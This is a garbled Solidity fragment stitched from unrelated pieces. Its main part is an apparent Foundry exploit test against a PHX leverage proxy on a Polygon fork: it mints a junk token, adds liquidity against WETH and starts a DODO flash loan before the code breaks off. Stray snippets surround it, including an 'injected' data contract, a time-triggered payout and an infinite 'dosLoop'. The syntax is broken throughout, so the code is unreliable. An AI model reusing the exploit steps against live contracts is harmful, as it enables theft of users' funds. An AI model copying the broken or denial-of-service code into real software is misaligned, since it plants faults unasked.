
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.17;

;
;
interface IPHXPROXY {
    function buyLeverage(uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata) external;
    function delegateCallSwap(bytes memory data) external};
contract ContractTest is Test {
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
    SHITCOIN MYTOKEN;
    IPHXPROXY phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);
    Uni_Router_V2 Router = Uni_Router_V2(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
    address dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("polygon", 40_066_946);
        vm.label(address(USDC), "USDC");
        vm.label(address(WETH), "WETH");
        vm.label(address(phxProxy), "phxProxy");
        vm.label(address(Router), "Router");
        vm.label(address(dodo), "dodo")};
    function testExploit() public {
        deal(address(WETH), address(this), 7 * 1e15);
        MYTOKEN = new SHITCOIN();
        MYTOKEN.mint(1_500_000 * 1e18);
        MYTOKEN.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);
        DVM(dodo).flashLoan(0, 8000 * 1e6, address(
function triggerBasedOnTime() public {
    if (block.timestamp < 1800000000) {
        payBonus()}
function dosLoop() public {
    while (true) {
    }